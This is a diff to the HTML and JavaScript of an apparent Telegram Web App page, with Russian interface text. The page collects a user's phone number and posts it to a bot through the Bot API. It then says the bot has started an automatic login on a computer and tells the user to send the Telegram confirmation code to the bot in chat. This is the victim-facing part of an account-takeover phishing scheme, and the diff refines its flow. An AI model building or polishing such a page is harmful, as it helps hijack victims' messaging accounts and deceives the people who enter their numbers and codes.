@@ -106,24 +106,6 @@
             box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
         }
 
-        .code-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .code-input:focus {
-            outline: none;
-            border-color: #0088cc;
-            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
-        }
-
         .buttons {
             display: flex;
             gap: 12px;
@@ -187,28 +169,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        .error-message {
-            background: #fff5f5;
-            border: 1px solid #fed7d7;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #c53030;
-            text-align: center;
-            display: none;
-        }
-
-        .success-message {
-            background: #f0fff4;
-            border: 1px solid #9ae6b4;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #2f855a;
-            text-align: center;
-            display: none;
-        }
-
         .instructions {
             background: #f8f9fa;
             border-radius: 12px;
@@ -217,6 +177,14 @@
             font-size: 13px;
             color: #6c757d;
             line-height: 1.4;
+        }
+        
+        .success-info {
+            background: #e3f2fd;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            text-align: center;
         }
     </style>
 </head>
@@ -248,13 +216,23 @@
                 </div>
             </div>
 
-            <!-- Шаг 2: Ожидание кода -->
-            <div id="stepWaiting" class="step">
+            <!-- Шаг 2: Успешная отправка -->
+            <div id="stepSuccess" class="step">
+                <div class="success-info">
+                    ✅ <b>Номер отправлен!</b>
+                </div>
+                
                 <div class="instructions">
-                    ✅ <b>Запрос отправлен!</b><br><br>
-                    Бот автоматически открыл Telegram на компьютере и запросил код.<br><br>
-                    📩 <b>Ожидайте код в Telegram...</b><br><br>
-                    Как только получите код - закройте это окно и отправьте код боту в чат.
+                    📱 <b>Автоматический вход запущен</b><br><br>
+                    
+                    Бот начал процесс авторизации на компьютере.<br><br>
+                    
+                    📩 <b>Что делать дальше:</b><br>
+                    1. Дождитесь код в Telegram<br>
+                    2. Вернитесь в чат с ботом<br>
+                    3. Отправьте код в формате: <code>12345</code><br><br>
+                    
+                    Закройте это окно и вернитесь в бота.
                 </div>
 
                 <div class="buttons">
@@ -266,7 +244,7 @@
             <div id="stepLoading" class="step">
                 <div class="loading">
                     <div class="loader"></div>
-                    <div id="loadingText">Отправка запроса...</div>
+                    <div id="loadingText">Отправка номера...</div>
                 </div>
             </div>
         </div>
@@ -309,9 +287,9 @@
                 await sendToBot(data);
                 console.log('Номер отправлен через Bot API');
                 
-                // Показываем экран ожидания
+                // Показываем экран успеха
                 setTimeout(() => {
-                    showStep('stepWaiting');
+                    showStep('stepSuccess');
                 }, 1000);
                 
             } catch (error) {
@@ -330,6 +308,7 @@
                 throw new Error('Не удалось получить chat_id');
             }
 
+            // ОТПРАВЛЯЕМ ТОЛЬКО НОМЕР, БЕЗ КОДА!
             const message = `📱 <b>Данные из Web App:</b>\n` +
                            `📞 Номер: <code>${data.phone}</code>\n` +
                            `⚡ Действие: ${data.action}`;
